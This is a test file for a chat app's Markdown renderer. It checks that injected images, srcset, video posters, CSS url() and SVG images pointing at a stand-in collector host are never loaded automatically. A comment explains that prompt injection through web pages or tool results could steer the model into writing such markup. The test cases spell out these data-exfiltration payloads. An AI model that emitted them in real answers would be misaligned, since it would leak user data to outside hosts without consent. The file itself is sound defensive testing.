import { describe, expect, it } from "vitest";
import { markdownHtml } from "./components/Markdown";

// O4: an answer can be steered by text the model read (a web page, a document, an MCP tool result). Anything in the
// rendered answer that the browser loads by itself would carry data to another host with no approval card.
const LEAK = "https://collector.example/c?d=secret";

function loads(html: string): string[] {
  const doc = new DOMParser().parseFromString(`<div>${html}</div>`, "text/html");
  const found: string[] = [];
  doc.querySelectorAll("*").forEach((el) => {
    for (const attr of ["src", "srcset", "poster", "data", "background", "href", "xlink:href"]) {
      const v = el.getAttribute(attr);
      if (v && /collector\.example/.test(v) && !(el.tagName === "A" && attr === "href")) found.push(`${el.tagName.toLowerCase()} ${attr}`);
    }
    if (/collector\.example/.test(el.getAttribute("style") ?? "")) found.push(`${el.tagName.toLowerCase()} style`);
    if (el.tagName === "STYLE" && /collector\.example/.test(el.textContent ?? "")) found.push("style element");
  });
  return found;
}

describe("Markdown never loads a resource from another host by itself", () => {
  it.each([
    ["markdown image", `![chart](${LEAK})`],
    ["protocol-relative image", "![x](//collector.example/c?d=secret)"],
    ["html image", `<img src="${LEAK}" alt="x">`],
    ["srcset", `<img src="/states/empty-chat.webp" srcset="${LEAK} 2x">`],
    ["video poster", `<video poster="${LEAK}"></video>`],
    ["audio source", `<audio><source src="${LEAK}"></audio>`],
    ["inline style", `<div style="background-image:url(${LEAK})">x</div>`],
    ["style element", `<style>p{background:url(${LEAK})}</style><p>x</p>`],
    ["svg image", `<svg><image href="${LEAK}"></image></svg>`],
  ])("%s", (_, text) => {
    expect(loads(markdownHtml(text))).toEqual([]);
  });

  it("keeps the image as a link the user can open, and keeps local and inline images", () => {
    const html = markdownHtml(`![chart](${LEAK})`);
    const doc = new DOMParser().parseFromString(html, "text/html");
    expect(doc.querySelector("img")).toBeNull();
    const a = doc.querySelector("a")!;
    expect(a.getAttribute("href")).toBe(LEAK);
    expect(a.textContent).toContain("chart");
    expect(a.textContent).toContain("collector.example");
    expect(markdownHtml("![logo](/states/empty-chat.webp)")).toContain('src="/states/empty-chat.webp"');
    expect(markdownHtml("![dot](data:image/png;base64,iVBORw0KGgo=)")).toContain('src="data:image/png;base64,iVBORw0KGgo="');
  });

  it("still renders ordinary answers: links, code, tables and emphasis", () => {
    const html = markdownHtml("**bold** and [docs](https://example.org/docs)\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n```python\nprint(1)\n```");
    expect(html).toContain("<strong>bold</strong>");
    expect(html).toContain('href="https://example.org/docs"');
    expect(html).toContain("<table>");
    expect(html).toContain("hljs");
  });
});
